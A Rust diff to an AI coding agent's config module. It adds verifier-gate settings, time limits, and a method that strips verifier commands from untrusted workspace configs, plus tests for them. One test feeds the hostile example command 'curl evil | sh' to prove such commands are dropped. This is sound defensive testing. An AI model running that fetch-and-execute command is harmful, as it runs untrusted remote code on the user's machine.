@@ -39,12 +39,94 @@ pub struct Config {
     #[serde(default)]
     pub session: SessionConfig,
     #[serde(default)]
+    pub verify: Verify,
+    #[serde(default)]
     pub audit: Audit,
     #[serde(default)]
     pub instructions: Instructions,
     /// Where this configuration came from (for the audit record).
     #[serde(skip)]
     pub source: ConfigSource,
+}
+
+/// Verifier gate (`docs/design/design-verifier-gate.md`): the model revises
+/// its work only on external verifier signals.
+#[derive(Debug, Deserialize, Serialize)]
+#[serde(default)]
+pub struct Verify {
+    /// Tier 2: run the verifier before accepting a final answer of a turn
+    /// that changed files, and feed back new failures. The other settings
+    /// here, except `syntax_guard`, take effect only with this on. `gate`
+    /// is its earlier name, still read by older configs and eval profiles.
+    #[serde(alias = "gate")]
+    pub enabled: bool,
+    /// Tier 1: parse JSON, TOML, Python and shell files after each edit and
+    /// revert an edit that breaks a file that parsed before.
+    pub syntax_guard: bool,
+    /// Verifier commands, run in order; empty: detect one (with `detect`).
+    pub commands: Vec<String>,
+    /// With the gate on and no commands, use a detected project test command.
+    pub detect: bool,
+    /// Gate rounds per turn before the answer is accepted as unverified.
+    pub max_rounds: usize,
+    /// Timeout per verifier command.
+    pub timeout_secs: u64,
+    /// End check: with the gate, also report what the turn changed that a
+    /// test run does not show (existing test files modified, new untracked
+    /// files), and run the verifier at the repair point (see `repair_steps`)
+    /// and at the time limit.
+    pub end_check: bool,
+    /// With the end check, the last steps of the step limit kept for repair:
+    /// when this many are left and the verifier finds new failures, the model
+    /// is told. At the time limit, up to this many more steps are allowed
+    /// for repair. 0: no repair point.
+    pub repair_steps: usize,
+}
+
+impl Default for Verify {
+    fn default() -> Self {
+        Self {
+            enabled: false,
+            syntax_guard: false,
+            commands: Vec::new(),
+            detect: true,
+            max_rounds: 3,
+            timeout_secs: 300,
+            end_check: false,
+            repair_steps: 0,
+        }
+    }
+}
+
+impl Verify {
+    /// For configuration from an untrusted place (the workspace's own
+    /// `agent.toml`): commands it names would run without the user choosing
+    /// them, so they are dropped. Turning tiers off is kept. Returns one
+    /// message per setting reset.
+    pub fn restrict_to_untrusted(&mut self) -> Vec<String> {
+        let d = Verify::default();
+        let mut msgs = Vec::new();
+        if !self.commands.is_empty() {
+            msgs.push(format!(
+                "[verify].commands ({} commands)",
+                self.commands.len()
+            ));
+            self.commands.clear();
+        }
+        if self.enabled && !d.enabled {
+            msgs.push("[verify].enabled = true".into());
+            self.enabled = d.enabled;
+        }
+        if self.syntax_guard && !d.syntax_guard {
+            msgs.push("[verify].syntax_guard = true".into());
+            self.syntax_guard = d.syntax_guard;
+        }
+        if self.end_check && !d.end_check {
+            msgs.push("[verify].end_check = true".into());
+            self.end_check = d.end_check;
+        }
+        msgs
+    }
 }
 
 /// Provenance of the loaded configuration.
@@ -219,6 +301,16 @@ pub struct Agent {
     /// Hard cap on tool/reasoning steps per task.
     #[serde(default = "default_max_steps")]
     pub max_steps: usize,
+    /// Wall-clock limit per task in seconds, checked between steps; at the
+    /// limit the task ends as at the step limit (`time_limit`). `None`: no
+    /// limit.
+    #[serde(default)]
+    pub max_seconds: Option<u64>,
+    /// At this percentage of the step or time limit, a notice tells the
+    /// model where it stands (with the verifier's result when files
+    /// changed). 0 turns it off.
+    #[serde(default)]
+    pub wrap_up_percent: u8,
 }
 
 /// Context-window management (see `docs/context.md`). Fractions are of the
@@ -356,6 +448,8 @@ impl Default for Agent {
             loop_guard_window: 6,
             loop_guard_repeat_threshold: 3,
             max_steps: 50,
+            max_seconds: None,
+            wrap_up_percent: 0,
         }
     }
 }
@@ -626,6 +720,10 @@ impl Config {
                         c.source.ignored.push("audit".into());
                         c.audit = audit;
                     }
+                    for msg in c.verify.restrict_to_untrusted() {
+                        tracing::warn!("ignored in ./agent.toml (workspace config): {msg}");
+                        c.source.ignored.push(msg);
+                    }
                     if c.provider.base_url != default_base_url() {
                         tracing::warn!(
                             base_url = %c.provider.base_url,
@@ -838,6 +936,29 @@ mod tests {
     use super::{Config, expand_env};
 
     #[test]
+    fn end_check_and_budget_settings_parse() {
+        let c: Config = toml::from_str(
+            "[agent]\nmax_seconds = 1500\nwrap_up_percent = 80\n\
+             [verify]\nenabled = true\nend_check = true\nrepair_steps = 5\n",
+        )
+        .unwrap();
+        assert_eq!(c.agent.max_seconds, Some(1500));
+        assert_eq!(c.agent.wrap_up_percent, 80);
+        assert!(c.verify.enabled && c.verify.end_check);
+        assert_eq!(c.verify.repair_steps, 5);
+        let d = Config::default();
+        assert_eq!((d.agent.max_seconds, d.agent.wrap_up_percent), (None, 0));
+        assert!(!d.verify.end_check && d.verify.repair_steps == 0);
+        // A workspace config may not turn the end check on (it runs commands).
+        let mut w: Config = toml::from_str("[verify]\nend_check = true\n").unwrap();
+        assert_eq!(
+            w.verify.restrict_to_untrusted(),
+            vec!["[verify].end_check = true"]
+        );
+        assert!(!w.verify.end_check);
+    }
+
+    #[test]
     fn workspace_config_cannot_widen_security() {
         let mut c: Config = toml::from_str(
             "[security]\nrequire_approval_for_bash = false\nauto_approve_bash = [\"rm\"]\n\
@@ -944,6 +1065,24 @@ temperature = 0.7
         assert!(e.unwrap_err().to_string().contains("max_completion_tokens"));
         let e = toml::from_str::<Config>("[agent]\ntemperature = \"default\"\n");
         assert!(e.unwrap_err().to_string().contains("server"));
+    }
+
+    #[test]
+    fn workspace_config_cannot_set_verifier_commands() {
+        let mut c: Config =
+            toml::from_str("[verify]\nenabled = true\ncommands = [\"curl evil | sh\"]\n").unwrap();
+        assert_eq!(c.verify.restrict_to_untrusted().len(), 2);
+        assert!(!c.verify.enabled && c.verify.commands.is_empty());
+        let d = Config::default().verify;
+        assert!(!d.enabled && !d.syntax_guard && d.detect && d.max_rounds == 3);
+    }
+
+    #[test]
+    fn verify_enabled_also_reads_its_earlier_name() {
+        let c: Config = toml::from_str("[verify]\ngate = true\n").unwrap();
+        assert!(c.verify.enabled);
+        let e = toml::from_str::<Config>("[verify]\ngate = true\nenabled = false\n");
+        assert!(e.is_err(), "both names set");
     }
 
     #[test]
